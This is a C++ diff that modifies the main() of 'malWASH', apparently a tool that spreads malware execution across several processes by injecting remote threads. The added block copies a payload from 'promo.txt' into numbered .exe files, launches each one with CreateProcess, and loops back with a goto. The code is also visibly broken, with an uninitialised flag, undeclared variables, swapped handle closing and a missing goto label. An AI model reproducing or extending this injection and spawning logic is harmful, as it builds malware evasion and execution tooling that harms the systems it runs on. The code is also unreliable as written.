@@ -508,14 +508,68 @@ int main(int argc, char* argv[])
 
     printf( "Done.\n" );
     printf( "[+] Launching executer() of all processes...\n" );
-
+//--Original malWASH modified---------------------------------------------------------------                
+//First Limitation proposed solution.
+//code ammended for creating own binaries.
+	int Flag;
     // resume all threads (ResumeThread(NULL) won't cause problems)
     for( uint i=0; i<shctrl->nproc; i++ )                   // for each process
-        printf( "Starting Emulator at process %d. Return Value: %d\n", 
+       { printf( "Starting Emulator at process %d. Return Value: %d\n", 
                 shctrl->pidtab[i],  
-                ResumeThread( threadid[i] ) );              // start remote thread execution
-                                                            // (no problem if it's NULL)
-                
+				y=ResumeThread( threadid[i] ) );     
+				if(Flag==-1)   
+				break;}
+
+     if( Flag==-1)
+	{  
+		for(int counter=0;counter<NPROC;counter++)
+	{   
+        stringstream sw;
+        //path for creating binaries
+		sw<<"C:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\mal\\Release\\ab"<<count1<<".exe";
+		count1++;
+		string aw=sw.str();
+        //copy the binary content to aw.c_str
+		copy("C:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\mal\\Release\\promo.txt", aw.c_str());
+		string a;
+		char ownPth[MAX_PATH];
+        
+	HMODULE hModule = GetModuleHandle(NULL);
+	if (hModule != NULL) {
+		GetModuleFileName(hModule, ownPth, (sizeof(ownPth)));
+		cout << ownPth;
+		a = ownPth;
+	}
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	Sleep(10000);
+	si.wShowWindow = SW_SHOW;
+	{CreateProcess(aw.c_str(),   
+		0,
+		NULL,
+		NULL,
+		FALSE,
+		CREATE_NEW_PROCESS_GROUP,
+		NULL,
+		NULL,
+		&si,
+		&pi
+	);
+	
+	if (pi.hThread)
+		CloseHandle(pi.hProcess);
+	if (pi.hProcess)
+		CloseHandle(pi.hThread);
+    }   //end of CreateProcess
+	   cout<<"done";
+	 } // end of for loop
+	    goto NAME;    //check avaialbility of the process once it is created
+	 }           
+//--end of modified malwash----------------                
     printf( "Done.\n" );
     
     // this delay is needed to make sure that the first emulator will start
@@ -527,3 +581,4 @@ int main(int argc, char* argv[])
     
     return 0;                                               // return success!
 }
+
